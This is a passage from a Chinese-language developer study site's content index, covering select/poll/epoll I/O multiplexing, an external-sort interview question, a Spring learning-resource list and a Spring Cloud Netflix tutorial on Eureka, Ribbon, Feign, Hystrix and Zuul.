sets FD_ZERO( \u0026amp;fd_in ); FD_ZERO( \u0026amp;fd_out ); // Monitor sock1 for input events FD_SET( sock1, \u0026amp;fd_in ); // Monitor sock2 for output events FD_SET( sock2, \u0026amp;fd_out ); // Find out which socket has the largest numeric value as select requires it int largest_sock = sock1 \u0026gt; sock2 ? sock1 : sock2; // Wait up to 10 seconds tv.tv_sec = 10; tv.tv_usec = 0; // Call the select int ret = select( largest_sock + 1, \u0026amp;fd_in, \u0026amp;fd_out, NULL, \u0026amp;tv ); // Check if select actually succeed if ( ret == -1 ) // report error and abort else if ( ret == 0 ) // timeout; no event detected else { if ( FD_ISSET( sock1, \u0026amp;fd_in ) ) // input event on sock1  if ( FD_ISSET( sock2, \u0026amp;fd_out ) ) // output event on sock2 } poll    int poll(struct pollfd *fds, unsigned int nfds, int timeout); poll 的功能与 select 类似，也是等待一组描述符中的一个成为就绪状态。\npoll 中的描述符是 pollfd 类型的数组，pollfd 的定义如下：\nstruct pollfd { int fd; /* file descriptor */ short events; /* requested events */ short revents; /* returned events */ }; // The structure for two events struct pollfd fds[2]; // Monitor sock1 for input fds[0].fd = sock1; fds[0].events = POLLIN; // Monitor sock2 for output fds[1].fd = sock2; fds[1].events = POLLOUT; // Wait 10 seconds int ret = poll( \u0026amp;fds, 2, 10000 ); // Check if poll actually succeed if ( ret == -1 ) // report error and abort else if ( ret == 0 ) // timeout; no event detected else { // If we detect the event, zero it out so we can reuse the structure  if ( fds[0].revents \u0026amp; POLLIN ) fds[0].revents = 0; // input event on sock1  if ( fds[1].revents \u0026amp; POLLOUT ) fds[1].revents = 0; // output event on sock2 } 比较    1. 功能    select 和 poll 的功能基本相同，不过在一些实现细节上有所不同。\n select 会修改描述符，而 poll 不会； select 的描述符类型使用数组实现，FD_SETSIZE 大小默认为 1024，因此默认只能监听少于 1024 个描述符。如果要监听更多描述符的话，需要修改 FD_SETSIZE 之后重新编译；而 poll 没有描述符数量的限制； poll 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。 如果一个线程对某个描述符调用了 select 或者 poll，另一个线程关闭了该描述符，会导致调用结果不确定。  2. 速度    select 和 poll 速度都比较慢，每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。\n3. 可移植性    几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。\nepoll    int epoll_create(int size); int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)； int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epoll_ctl() 用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 epoll_wait() 便可以得到事件完成的描述符。\n从上面的描述可以看出，epoll 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。\nepoll 仅适用于 Linux OS。\nepoll 比 select 和 poll 更加灵活而且没有描述符数量限制。\nepoll 对多线程编程更有友好，一个线程调用了 epoll_wait() 另一个线程关闭了同一个描述符也不会产生像 select 和 poll 的不确定情况。\n// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets. // The function argument is ignored (it was not before, but now it is), so put your favorite number here int pollingfd = epoll_create( 0xCAFE ); if ( pollingfd \u0026lt; 0 ) // report error  // Initialize the epoll structure in case more members are added in future struct epoll_event ev = { 0 }; // Associate the connection class instance with the event. You can associate anything // you want, epoll does not use this information. We store a connection class pointer, pConnection1 ev.data.ptr = pConnection1; // Monitor for input, and do not automatically rearm the descriptor after the event ev.events = EPOLLIN | EPOLLONESHOT; // Add the descriptor into the monitoring list. We can do it even if another thread is // waiting in epoll_wait - the descriptor will be properly added if ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-\u0026gt;getSocket(), \u0026amp;ev ) != 0 ) // report error  // Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen) struct epoll_event pevents[ 20 ]; // Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array int ready = epoll_wait( pollingfd, pevents, 20, 10000 ); // Check if epoll actually succeed if ( ret == -1 ) // report error and abort else if ( ret == 0 ) // timeout; no event detected else { // Check if any events detected  for ( int i = 0; i \u0026lt; ready; i++ ) { if ( pevents[i].events \u0026amp; EPOLLIN ) { // Get back our connection pointer  Connection * c = (Connection*) pevents[i].data.ptr; c-\u0026gt;handleReadEvent(); } } } 工作模式    epoll 的描述符事件有两种触发模式：LT（level trigger）和 ET（edge trigger）。\n1. LT 模式    当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。\n2. ET 模式    和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 epoll_wait() 时不会再得到事件到达的通知。\n很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。\n应用场景    很容易产生一种错觉认为只要用 epoll 就可以了，select 和 poll 都已经过时了，其实它们都有各自的使用场景。\n1. select 应用场景    select 的 timeout 参数精度为微秒，而 poll 和 epoll 为毫秒，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。\nselect 可移植性更好，几乎被所有主流平台所支持。\n2. poll 应用场景    poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。\n3. epoll 应用场景    只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。\n需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。\n需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。\n参考资料     Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004. http://man7.org/linux/man-pages/man2/select.2.html http://man7.org/linux/man-pages/man2/poll.2.html Boost application performance using asynchronous I/O Synchronous and Asynchronous I/O Linux IO 模式及 select、poll、epoll 详解 poll vs select vs event-based select / poll / epoll: practical difference for system architects Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online  "},{"id":300,"href":"/%E5%A4%A7%E6%95%B0%E6%8D%AE/sort-the-query-strings-by-counts/","title":"sort-the-query-strings-by-counts","parent":"大数据","content":"如何按照 query 的频度排序？    题目描述    有 10 个文件，每个文件大小为 1G，每个文件的每一行存放的都是用户的 query，每个文件的 query 都可能重复。要求按照 query 的频度排序。\n解答思路    如果 query 的重复度比较大，可以考虑一次性把所有 query 读入内存中处理；如果 query 的重复率不高，那么可用内存不足以容纳所有的 query，这时候就需要采用分治法或其他的方法来解决。\n方法一：HashMap 法    如果 query 重复率高，说明不同 query 总数比较小，可以考虑把所有的 query 都加载到内存中的 HashMap 中。接着就可以按照 query 出现的次数进行排序。\n方法二：分治法    分治法需要根据数据量大小以及可用内存的大小来确定问题划分的规模。对于这道题，可以顺序遍历 10 个文件中的 query，通过 Hash 函数 hash(query) % 10 把这些 query 划分到 10 个小文件中。之后对每个小文件使用 HashMap 统计 query 出现次数，根据次数排序并写入到零外一个单独文件中。\n接着对所有文件按照 query 的次数进行排序，这里可以使用归并排序（由于无法把所有 query 都读入内存，因此需要使用外排序）。\n方法总结     内存若够，直接读入进行排序； 内存不够，先划分为小文件，小文件排好序后，整理使用外排序进行归并。  "},{"id":301,"href":"/system-design/framework/spring/Spring/","title":"Spring","parent":"spring","content":"Spring相关教程/资料    官网相关     Spring官网、Spring系列主要项目、Spring官网指南、官方文档 spring-framework-reference Spring Framework 4.3.17.RELEASE API  系统学习教程    文档     极客学院Spring Wiki Spring W3Cschool教程   视频      网易云课堂——58集精通java教程Spring框架开发\n  慕课网相关视频\n  黑马视频和尚硅谷视频（非常推荐）： 微信公众号：“JavaGuide”后台回复关键字 “1” 免费领取。\n  面试必备知识点    SpringAOP,IOC实现原理    AOP实现原理、动态代理和静态代理、Spring IOC的初始化过程、IOC原理、自己实现怎么实现一个IOC容器？这些东西都是经常会被问到的。\n推荐阅读：\n  自己动手实现的 Spring IOC 和 AOP - 上篇\n  自己动手实现的 Spring IOC 和 AOP - 下篇\n  AOP    AOP思想的实现一般都是基于 代理模式 ，在JAVA中一般采用JDK动态代理模式，但是我们都知道，JDK动态代理模式只能代理接口而不能代理类。因此，Spring AOP 会这样子来进行切换，因为Spring AOP 同时支持 CGLIB、ASPECTJ、JDK动态代理。\n 如果目标对象的实现类实现了接口，Spring AOP 将会采用 JDK 动态代理来生成 AOP 代理类； 如果目标对象的实现类没有实现接口，Spring AOP 将会采用 CGLIB 来生成 AOP 代理类——不过这个选择过程对开发者完全透明、开发者也无需关心。  推荐阅读：\n 静态代理、JDK动态代理、CGLIB动态代理讲解 ：我们知道AOP思想的实现一般都是基于 代理模式 ，所以在看下面的文章之前建议先了解一下静态代理以及JDK动态代理、CGLIB动态代理的实现方式。 Spring AOP 入门 ：带你入门的一篇文章。这篇文章主要介绍了AOP中的基本概念：5种类型的通知（Before，After，After-returning，After-throwing，Around）；Spring中对AOP的支持：AOP思想的实现一般都是基于代理模式，在Java中一般采用JDK动态代理模式，Spring AOP 同时支持 CGLIB、ASPECTJ、JDK动态代理， Spring AOP 基于AspectJ注解如何实现AOP ： AspectJ是一个AOP框架，它能够对java代码进行AOP编译（一般在编译期进行），让java代码具有AspectJ的AOP功能（当然需要特殊的编译器），可以这样说AspectJ是目前实现AOP框架中最成熟，功能最丰富的语言，更幸运的是，AspectJ与java程序完全兼容，几乎是无缝关联，因此对于有java编程基础的工程师，上手和使用都非常容易。Spring注意到AspectJ在AOP的实现方式上依赖于特殊编译器(ajc编译器)，因此Spring很机智回避了这点，转向采用动态代理技术的实现原理来构建Spring AOP的内部机制（动态织入），这是与AspectJ（静态织入）最根本的区别。Spring 只是使用了与 AspectJ 5 一样的注解，但仍然没有使用 AspectJ 的编译器，底层依是动态代理技术的实现，因此并不依赖于 AspectJ 的编译器。 Spring AOP虽然是使用了那一套注解，其实实现AOP的底层是使用了动态代理(JDK或者CGLib)来动态植入。至于AspectJ的静态植入，不是本文重点，所以只提一提。 探秘Spring AOP（慕课网视频，很不错）:慕课网视频，讲解的很不错，详细且深入 spring源码剖析（六）AOP实现原理剖析 :通过源码分析Spring AOP的原理  IOC     [Spring框架]Spring IOC的原理及详解。 Spring IOC核心源码学习 :比较简短，推荐阅读。 Spring IOC 容器源码分析 :强烈推荐，内容详尽，而且便于阅读。 Bean初始化过程  Spring事务管理     可能是最漂亮的Spring事务管理详解 Spring编程式和声明式事务实例讲解  Spring单例与线程安全     Spring框架中的单例模式（源码解读）:单例模式是一种常用的软件设计模式。通过单例模式可以保证系统中一个类只有一个实例。spring依赖注入时，使用了 多重判断加锁 的单例模式。  Spring源码阅读    阅读源码不仅可以加深我们对Spring设计思想的理解，提高自己的编码水平，还可以让自己在面试中如鱼得水。下面的是Github上的一个开源的Spring源码阅读，大家有时间可以看一下，当然你如果有时间也可以自己慢慢研究源码。\n spring-core spring-aop spring-context spring-task spring-transaction spring-mvc guava-cache  "},{"id":302,"href":"/system-design/micro-service/spring-cloud/","title":"spring-cloud","parent":"micro-service","content":" 本文基于 Spring Cloud Netflix 。Spring Cloud Alibaba 也是非常不错的选择哦！\n授权转载自：https://juejin.im/post/5de2553e5188256e885f4fa3\n 首先我给大家看一张图，如果大家对这张图有些地方不太理解的话，我希望你们看完我这篇文章会恍然大悟。\n什么是Spring cloud     构建分布式系统不需要复杂和容易出错。Spring Cloud 为最常见的分布式系统模式提供了一种简单且易于接受的编程模型，帮助开发人员构建有弹性的、可靠的、协调的应用程序。Spring Cloud 构建于 Spring Boot 之上，使得开发者很容易入手并快速应用于生产中。\n 官方果然官方，介绍都这么有板有眼的。\n我所理解的 Spring Cloud 就是微服务系统架构的一站式解决方案，在平时我们构建微服务的过程中需要做如 服务发现注册 、配置中心 、消息总线 、负载均衡 、断路器 、数据监控 等操作，而 Spring Cloud 为我们提供了一套简易的编程模型，使我们能在 Spring Boot 的基础上轻松地实现微服务项目的构建。\nSpring Cloud 的版本    当然这个只是个题外话。\nSpring Cloud 的版本号并不是我们通常见的数字版本号，而是一些很奇怪的单词。这些单词均为英国伦敦地铁站的站名。同时根据字母表的顺序来对应版本时间顺序，比如：最早 的 Release 版本 Angel，第二个 Release 版本 Brixton（英国地名），然后是 Camden、 Dalston、Edgware、Finchley、Greenwich、Hoxton。\nSpring Cloud 的服务发现框架——Eureka     Eureka是基于REST（代表性状态转移）的服务，主要在 AWS 云中用于定位服务，以实现负载均衡和中间层服务器的故障转移。我们称此服务为Eureka服务器。Eureka还带有一个基于 Java 的客户端组件 Eureka Client，它使与服务的交互变得更加容易。客户端还具有一个内置的负载平衡器，可以执行基本的循环负载平衡。在 Netflix，更复杂的负载均衡器将 Eureka 包装起来，以基于流量，资源使用，错误条件等多种因素提供加权负载均衡，以提供出色的弹性。\n 总的来说，Eureka 就是一个服务发现框架。何为服务，何又为发现呢？\n举一个生活中的例子，就比如我们平时租房子找中介的事情。\n在没有中介的时候我们需要一个一个去寻找是否有房屋要出租的房东，这显然会非常的费力，一你找凭一个人的能力是找不到很多房源供你选择，再者你也懒得这么找下去(找了这么久，没有合适的只能将就)。这里的我们就相当于微服务中的 Consumer ，而那些房东就相当于微服务中的 Provider 。消费者 Consumer 需要调用提供者 Provider 提供的一些服务，就像我们现在需要租他们的房子一样。\n但是如果只是租客和房东之间进行寻找的话，他们的效率是很低的，房东找不到租客赚不到钱，租客找不到房东住不了房。所以，后来房东肯定就想到了广播自己的房源信息(比如在街边贴贴小广告)，这样对于房东来说已经完成他的任务(将房源公布出去)，但是有两个问题就出现了。第一、其他不是租客的都能收到这种租房消息，这在现实世界没什么，但是在计算机的世界中就会出现 资源消耗 的问题了。第二、租客这样还是很难找到你，试想一下我需要租房，我还需要东一个西一个地去找街边小广告，麻不麻烦？\n那怎么办呢？我们当然不会那么傻乎乎的，第一时间就是去找 中介 呀，它为我们提供了统一房源的地方，我们消费者只需要跑到它那里去找就行了。而对于房东来说，他们也只需要把房源在中介那里发布就行了。\n那么现在，我们的模式就是这样的了。\n但是，这个时候还会出现一些问题。\n 房东注册之后如果不想卖房子了怎么办？我们是不是需要让房东 定期续约 ？如果房东不进行续约是不是要将他们从中介那里的注册列表中 移除 。 租客是不是也要进行 注册 呢？不然合同乙方怎么来呢？ 中介可不可以做 连锁店 呢？如果这一个店因为某些不可抗力因素而无法使用，那么我们是否可以换一个连锁店呢？  针对上面的问题我们来重新构建一下上面的模式图\n好了，举完这个:chestnut:我们就可以来看关于 Eureka 的一些基础概念了，你会发现这东西理解起来怎么这么简单。:punch::punch::punch:\n服务发现：其实就是一个“中介”，整个过程中有三个角色：服务提供者(出租房子的)、服务消费者(租客)、服务中介(房屋中介)。\n服务提供者： 就是提供一些自己能够执行的一些服务给外界。\n服务消费者： 就是需要使用一些服务的“用户”。\n服务中介： 其实就是服务提供者和服务消费者之间的“桥梁”，服务提供者可以把自己注册到服务中介那里，而服务消费者如需要消费一些服务(使用一些功能)就可以在服务中介中寻找注册在服务中介的服务提供者。\n服务注册 Register：\n官方解释：当 Eureka 客户端向 Eureka Server 注册时，它提供自身的元数据，比如IP地址、端口，运行状况指示符URL，主页等。\n结合中介理解：房东 (提供者 Eureka Client Provider)在中介 (服务器 Eureka Server) 那里登记房屋的信息，比如面积，价格，地段等等(元数据 metaData)。\n服务续约 Renew：\n官方解释：Eureka 客户会每隔30秒(默认情况下)发送一次心跳来续约。 通过续约来告知 Eureka Server 该 Eureka 客户仍然存在，没有出现问题。 正常情况下，如果 Eureka Server 在90秒没有收到 Eureka 客户的续约，它会将实例从其注册表中删除。\n结合中介理解：房东 (提供者 Eureka Client Provider) 定期告诉中介 (服务器 Eureka Server) 我的房子还租(续约) ，中介 (服务器Eureka Server) 收到之后继续保留房屋的信息。\n获取注册列表信息 Fetch Registries：\n官方解释：Eureka 客户端从服务器获取注册表信息，并将其缓存在本地。客户端会使用该信息查找其他服务，从而进行远程调用。该注册列表信息定期（每30秒钟）更新一次。每次返回注册列表信息可能与 Eureka 客户端的缓存信息不同, Eureka 客户端自动处理。如果由于某种原因导致注册列表信息不能及时匹配，Eureka 客户端则会重新获取整个注册表信息。 Eureka 服务器缓存注册列表信息，整个注册表以及每个应用程序的信息进行了压缩，压缩内容和没有压缩的内容完全相同。Eureka 客户端和 Eureka 服务器可以使用JSON / XML格式进行通讯。在默认的情况下 Eureka 客户端使用压缩 JSON 格式来获取注册列表的信息。\n结合中介理解：租客(消费者 Eureka Client Consumer) 去中介 (服务器 Eureka Server) 那里获取所有的房屋信息列表 (客户端列表 Eureka Client List) ，而且租客为了获取最新的信息会定期向中介 (服务器 Eureka Server) 那里获取并更新本地列表。\n服务下线 Cancel：\n官方解释：Eureka客户端在程序关闭时向Eureka服务器发送取消请求。 发送请求后，该客户端实例信息将从服务器的实例注册表中删除。该下线请求不会自动完成，它需要调用以下内容：DiscoveryManager.getInstance().shutdownComponent();\n结合中介理解：房东 (提供者 Eureka Client Provider) 告诉中介 (服务器 Eureka Server) 我的房子不租了，中介之后就将注册的房屋信息从列表中剔除。\n服务剔除 Eviction：\n官方解释：在默认的情况下，当Eureka客户端连续90秒(3个续约周期)没有向Eureka服务器发送服务续约，即心跳，Eureka服务器会将该服务实例从服务注册列表删除，即服务剔除。\n结合中介理解：房东(提供者 Eureka Client Provider) 会定期联系 中介 (服务器 Eureka Server) 告诉他我的房子还租(续约)，如果中介 (服务器 Eureka Server) 长时间没收到提供者的信息，那么中介会将他的房屋信息给下架(服务剔除)。\n下面就是 Netflix 官方给出的 Eureka 架构图，你会发现和我们前面画的中介图别无二致。\n当然，可以充当服务发现的组件有很多：Zookeeper ，Consul ， Eureka 等。\n更多关于 Eureka 的知识(自我保护，初始注册策略等等)可以自己去官网查看，或者查看我的另一篇文章 深入理解 Eureka。\n负载均衡之 Ribbon    什么是 RestTemplate?    不是讲 Ribbon 么？怎么扯到了 RestTemplate 了？你先别急，听我慢慢道来。\n我不听我不听我不听:hear_no_evil::hear_no_evil::hear_no_evil:。\n我就说一句！RestTemplate是Spring提供的一个访问Http服务的客户端类，怎么说呢？就是微服务之间的调用是使用的 RestTemplate 。比如这个时候我们 消费者B 需要调用 提供者A 所提供的服务我们就需要这么写。如我下面的伪代码。\n@Autowired private RestTemplate restTemplate; // 这里是提供者A的ip地址，但是如果使用了 Eureka 那么就应该是提供者A的名称 private static final String SERVICE_PROVIDER_A = \u0026#34;http://localhost:8081\u0026#34;; @PostMapping(\u0026#34;/judge\u0026#34;) public boolean judge(@RequestBody Request request) { String url = SERVICE_PROVIDER_A + \u0026#34;/service1\u0026#34;; return restTemplate.postForObject(url, request, Boolean.class); } 如果你对源码感兴趣的话，你会发现上面我们所讲的 Eureka 框架中的 注册、续约 等，底层都是使用的 RestTemplate 。\n为什么需要 Ribbon？    Ribbon 是 Netflix 公司的一个开源的负载均衡 项目，是一个客户端/进程内负载均衡器，运行在消费者端。\n我们再举个:chestnut:，比如我们设计了一个秒杀系统，但是为了整个系统的 高可用 ，我们需要将这个系统做一个集群，而这个时候我们消费者就可以拥有多个秒杀系统的调用途径了，如下图。\n如果这个时候我们没有进行一些 均衡操作 ，如果我们对 秒杀系统1 进行大量的调用，而另外两个基本不请求，就会导致 秒杀系统1 崩溃，而另外两个就变成了傀儡，那么我们为什么还要做集群，我们高可用体现的意义又在哪呢？\n所以 Ribbon 出现了，注意我们上面加粗的几个字——运行在消费者端。指的是，Ribbon 是运行在消费者端的负载均衡器，如下图。\n其工作原理就是 Consumer 端获取到了所有的服务列表之后，在其内部使用负载均衡算法，进行对多个系统的调用。\nNginx 和 Ribbon 的对比    提到 负载均衡 就不得不提到大名鼎鼎的 Nignx 了，而和 Ribbon 不同的是，它是一种集中式的负载均衡器。\n何为集中式呢？简单理解就是 将所有请求都集中起来，然后再进行负载均衡。如下图。\n我们可以看到 Nginx 是接收了所有的请求进行负载均衡的，而对于 Ribbon 来说它是在消费者端进行的负载均衡。如下图。\n 请注意 Request 的位置，在 Nginx 中请求是先进入负载均衡器，而在 Ribbon 中是先在客户端进行负载均衡才进行请求的。\n Ribbon 的几种负载均衡算法    负载均衡，不管 Nginx 还是 Ribbon 都需要其算法的支持，如果我没记错的话 Nginx 使用的是 轮询和加权轮询算法。而在 Ribbon 中有更多的负载均衡调度算法，其默认是使用的 RoundRobinRule 轮询策略。\n RoundRobinRule：轮询策略。Ribbon 默认采用的策略。若经过一轮轮询没有找到可用的 provider，其最多轮询 10 轮。若最终还没有找到，则返回 null。 RandomRule: 随机策略，从所有可用的 provider 中随机选择一个。 RetryRule: 重试策略。先按照 RoundRobinRule 策略获取 provider，若获取失败，则在指定的时限内重试。默认的时限为 500 毫秒。  🐦🐦🐦 还有很多，这里不一一举:chestnut:了，你最需要知道的是默认轮询算法，并且可以更换默认的负载均衡算法，只需要在配置文件中做出修改就行。\nproviderName:ribbon:NFLoadBalancerRuleClassName:com.netflix.loadbalancer.RandomRule当然，在 Ribbon 中你还可以自定义负载均衡算法，你只需要实现 IRule 接口，然后修改配置文件或者自定义 Java Config 类。\n什么是 Open Feign    有了 Eureka ，RestTemplate ，Ribbon， 我们就可以愉快地进行服务间的调用了，但是使用 RestTemplate 还是不方便，我们每次都要进行这样的调用。\n@Autowired private RestTemplate restTemplate; // 这里是提供者A的ip地址，但是如果使用了 Eureka 那么就应该是提供者A的名称 private static final String SERVICE_PROVIDER_A = \u0026#34;http://localhost:8081\u0026#34;; @PostMapping(\u0026#34;/judge\u0026#34;) public boolean judge(@RequestBody Request request) { String url = SERVICE_PROVIDER_A + \u0026#34;/service1\u0026#34;; // 是不是太麻烦了？？？每次都要 url、请求、返回类型的  return restTemplate.postForObject(url, request, Boolean.class); } 这样每次都调用 RestRemplate 的 API 是否太麻烦，我能不能像调用原来代码一样进行各个服务间的调用呢？\n:bulb::bulb::bulb:聪明的小朋友肯定想到了，那就用 映射 呀，就像域名和IP地址的映射。我们可以将被调用的服务代码映射到消费者端，这样我们就可以 **“无缝开发” **啦。\n OpenFeign 也是运行在消费者端的，使用 Ribbon 进行负载均衡，所以 OpenFeign 直接内置了 Ribbon。\n 在导入了 Open Feign 之后我们就可以进行愉快编写 Consumer 端代码了。\n// 使用 @FeignClient 注解来指定提供者的名字 @FeignClient(value = \u0026#34;eureka-client-provider\u0026#34;) public interface TestClient { // 这里一定要注意需要使用的是提供者那端的请求相对路径，这里就相当于映射了  @RequestMapping(value = \u0026#34;/provider/xxx\u0026#34;, method = RequestMethod.POST) CommonResponse\u0026lt;List\u0026lt;Plan\u0026gt;\u0026gt; getPlans(@RequestBody planGetRequest request); } 然后我们在 Controller 就可以像原来调用 Service 层代码一样调用它了。\n@RestController public class TestController { // 这里就相当于原来自动注入的 Service  @Autowired private TestClient testClient; // controller 调用 service 层代码  @RequestMapping(value = \u0026#34;/test\u0026#34;, method = RequestMethod.POST) public CommonResponse\u0026lt;List\u0026lt;Plan\u0026gt;\u0026gt; get(@RequestBody planGetRequest request) { return testClient.getPlans(request); } } 必不可少的 Hystrix    什么是 Hystrix之熔断和降级     在分布式环境中，不可避免地会有许多服务依赖项中的某些失败。Hystrix是一个库，可通过添加等待时间容限和容错逻辑来帮助您控制这些分布式服务之间的交互。Hystrix通过隔离服务之间的访问点，停止服务之间的级联故障并提供后备选项来实现此目的，所有这些都可以提高系统的整体弹性。\n 总体来说 Hystrix 就是一个能进行 熔断 和 降级 的库，通过使用它能提高整个系统的弹性。\n那么什么是 熔断和降级 呢？再举个:chestnut:，此时我们整个微服务系统是这样的。服务A调用了服务B，服务B再调用了服务C，但是因为某些原因，服务C顶不住了，这个时候大量请求会在服务C阻塞。\n服务C阻塞了还好，毕竟只是一个系统崩溃了。但是请注意这个时候因为服务C不能返回响应，那么服务B调用服务C的的请求就会阻塞，同理服务B阻塞了，那么服务A也会阻塞崩溃。\n 请注意，为什么阻塞会崩溃。因为这些请求会消耗占用系统的线程、IO 等资源，消耗完你这个系统服务器不就崩了么。\n 这就叫 服务雪崩。妈耶，上面两个 熔断 和 降级 你都没给我解释清楚，你现在又给我扯什么 服务雪崩 ？:tired_face::tired_face::tired_face:\n别急，听我慢慢道来。\n不听我也得讲下去！\n所谓 熔断 就是服务雪崩的一种有效解决方案。当指定时间窗内的请求失败率达到设定阈值时，系统将通过 断路器 直接将此请求链路断开。\n也就是我们上面服务B调用服务C在指定时间窗内，调用的失败率到达了一定的值，那么 Hystrix 则会自动将 服务B与C 之间的请求都断了，以免导致服务雪崩现象。\n其实这里所讲的 熔断 就是指的 Hystrix 中的 断路器模式 ，你可以使用简单的 @HystrixCommand 注解来标注某个方法，这样 Hystrix 就会使用 断路器 来“包装”这个方法，每当调用时间超过指定时间时(默认为1000ms)，断路器将会中断对这个方法的调用。\n当然你可以对这个注解的很多属性进行设置，比如设置超时时间，像这样。\n@HystrixCommand( commandProperties = {@HystrixProperty(name = \u0026#34;execution.isolation.thread.timeoutInMilliseconds\u0026#34;,value = \u0026#34;1200\u0026#34;)} ) public List\u0026lt;Xxx\u0026gt; getXxxx() { // ...省略代码逻辑 } 但是，我查阅了一些博客，发现他们都将 熔断 和 降级 的概念混淆了，以我的理解，降级是为了更好的用户体验，当一个方法调用异常时，通过执行另一种代码逻辑来给用户友好的回复。这也就对应着 Hystrix 的 后备处理 模式。你可以通过设置 fallbackMethod 来给一个方法设置备用的代码逻辑。比如这个时候有一个热点新闻出现了，我们会推荐给用户查看详情，然后用户会通过id去查询新闻的详情，但是因为这条新闻太火了(比如最近什么*易对吧)，大量用户同时访问可能会导致系统崩溃，那么我们就进行 服务降级 ，一些请求会做一些降级处理比如当前人数太多请稍后查看等等。\n// 指定了后备方法调用 @HystrixCommand(fallbackMethod = \u0026#34;getHystrixNews\u0026#34;) @GetMapping(\u0026#34;/get/news\u0026#34;) public News getNews(@PathVariable(\u0026#34;id\u0026#34;) int id) { // 调用新闻系统的获取新闻api 代码逻辑省略 } // public News getHystrixNews(@PathVariable(\u0026#34;id\u0026#34;) int id) { // 做服务降级  // 返回当前人数太多，请稍后查看 } 什么是Hystrix之其他    我在阅读 《Spring微服务实战》这本书的时候还接触到了一个 舱壁模式 的概念。在不使用舱壁模式的情况下，服务A调用服务B，这种调用默认的是 使用同一批线程来执行 的，而在一个服务出现性能问题的时候，就会出现所有线程被刷爆并等待处理工作，同时阻塞新请求，最终导致程序崩溃。而舱壁模式会将远程资源调用隔离在他们自己的线程池中，以便可以控制单个表现不佳的服务，而不会使该程序崩溃。\n具体其原理我推荐大家自己去了解一下，本篇文章中对 舱壁模式 不做过多解释。当然还有 Hystrix 仪表盘，它是用来实时监控 Hystrix 的各项指标信息的，这里我将这个问题也抛出去，希望有不了解的可以自己去搜索一下。\n微服务网关——Zuul     ZUUL 是从设备和 web 站点到 Netflix 流应用后端的所有请求的前门。作为边界服务应用，ZUUL 是为了实现动态路由、监视、弹性和安全性而构建的。它还具有根据情况将请求路由到多个 Amazon Auto Scaling Groups（亚马逊自动缩放组，亚马逊的一种云计算方式） 的能力\n 在上面我们学习了 Eureka 之后我们知道了 服务提供者 是 消费者 通过 Eureka Server 进行访问的，即 Eureka Server 是 服务提供者 的统一入口。那么整个应用中存在那么多 消费者 需要用户进行调用，这个时候用户该怎样访问这些 消费者工程 呢？当然可以像之前那样直接访问这些工程。但这种方式没有统一的消费者工程调用入口，不便于访问与管理，而 Zuul 就是这样的一个对于 消费者 的统一入口。\n 如果学过前端的肯定都知道 Router 吧，比如 Flutter 中的路由，Vue，React中的路由，用了 Zuul 你会发现在路由功能方面和前端配置路由基本是一个理。:smile: 我偶尔撸撸 Flutter。\n 大家对网关应该很熟吧，简单来讲网关是系统唯一对外的入口，介于客户端与服务器端之间，用于对请求进行鉴权、限流、 路由、监控等功能。\n没错，网关有的功能，Zuul 基本都有。而 Zuul 中最关键的就是 路由和过滤器 了，在官方文档中 Zuul 的标题就是\n Router and Filter : Zuul\n Zuul 的路由功能    简单配置    本来想给你们复制一些代码，但是想了想，因为各个代码配置比较零散，看起来也比较零散，我决定还是给你们画个图来解释吧。\n 请不要因为我这么好就给我点赞 :thumbsup: 。 疯狂暗示。\n 比如这个时候我们已经向 Eureka Server 注册了两个 Consumer 、三个 Provicer ，这个时候我们再加个 Zuul 网关应该变成这样子了。\nemmm，信息量有点大，我来解释一下。关于前面的知识我就不解释了:neutral_face:。\n首先，Zuul 需要向 Eureka 进行注册，注册有啥好处呢？\n你傻呀，Consumer 都向 Eureka Server 进行注册了，我网关是不是只要注册就能拿到所有 Consumer 的信息了？\n拿到信息有什么好处呢？\n我拿到信息我是不是可以获取所有的 Consumer 的元数据(名称，ip，端口)？\n拿到这些元数据有什么好处呢？拿到了我们是不是直接可以做路由映射？比如原来用户调用 Consumer1 的接口 localhost:8001/studentInfo/update 这个请求，我们是不是可以这样进行调用了呢？localhost:9000/consumer1/studentInfo/update 呢？你这样是不是恍然大悟了？\n 这里的url为了让更多人看懂所以没有使用 restful 风格。\n 上面的你理解了，那么就能理解关于 Zuul 最基本的配置了，看下面。\nserver:port:9000eureka:client:service-url:# 这里只要注册 Eureka 就行了defaultZone:http://localhost:9997/eureka然后在启动类上加入 @EnableZuulProxy 注解就行了。没错，就是那么简单:smiley:。\n统一前缀    这个很简单，就是我们可以在前面加一个统一的前缀，比如我们刚刚调用的是 localhost:9000/consumer1/studentInfo/update，这个时候我们在 yaml 配置文件中添加如下。\nzuul:prefix:/zuul这样我们就需要通过 